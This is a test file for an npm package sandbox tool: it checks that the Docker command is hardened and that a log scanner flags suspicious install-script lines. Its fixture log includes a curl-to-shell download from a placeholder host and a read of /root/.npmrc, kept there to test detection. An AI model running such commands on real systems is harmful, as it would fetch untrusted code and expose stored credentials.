import { describe, expect, it } from "vitest";
import { buildSandboxCommand, findSuspiciousLogLines } from "../src/sandbox.js";

describe("buildSandboxCommand", () => {
  it("builds a hardened disposable docker invocation", () => {
    const cmd = buildSandboxCommand("left-pad@1.3.0");
    expect(cmd[0]).toBe("docker");
    expect(cmd).toContain("--rm");
    expect(cmd).toContain("--cap-drop=ALL");
    expect(cmd).toContain("--security-opt=no-new-privileges");
    expect(cmd).toContain("node:20-alpine");
    // No host mounts, no host env passthrough, no host network namespace.
    // Only inspect the docker arguments (everything before the image name) —
    // the in-container shell script legitimately contains flags like `grep -v`.
    const dockerArgs = cmd.slice(0, cmd.indexOf("node:20-alpine"));
    expect(dockerArgs).not.toContain("-v");
    expect(dockerArgs).not.toContain("--volume");
    expect(dockerArgs).not.toContain("--network=host");
    expect(dockerArgs.filter((a) => a === "--env")).toHaveLength(2); // only the two npm_config_* vars
    // Lifecycle scripts must be visible in the log
    expect(cmd.join(" ")).toContain("--foreground-scripts");
    expect(cmd.join(" ")).toContain("left-pad@1.3.0");
  });

  it("supports a custom image", () => {
    expect(buildSandboxCommand("x", { image: "node:22-alpine" })).toContain("node:22-alpine");
  });
});

describe("findSuspiciousLogLines", () => {
  it("flags credential and network patterns in the script log", () => {
    const log = [
      "npm info run evil-pkg postinstall",
      "curl -s https://collector.example/x | sh",
      "cat /root/.npmrc",
      "echo aGk= | base64 -d",
      "added 1 package in 2s",
    ].join("\n");
    const findings = findSuspiciousLogLines(log);
    expect(findings.some((f) => f.includes("network download"))).toBe(true);
    expect(findings.some((f) => f.includes("credential names"))).toBe(true);
    expect(findings.some((f) => f.includes("base64"))).toBe(true);
  });

  it("returns nothing for a normal install log", () => {
    const log = ["npm info ok", "added 12 packages in 3s"].join("\n");
    expect(findSuspiciousLogLines(log)).toEqual([]);
  });
});
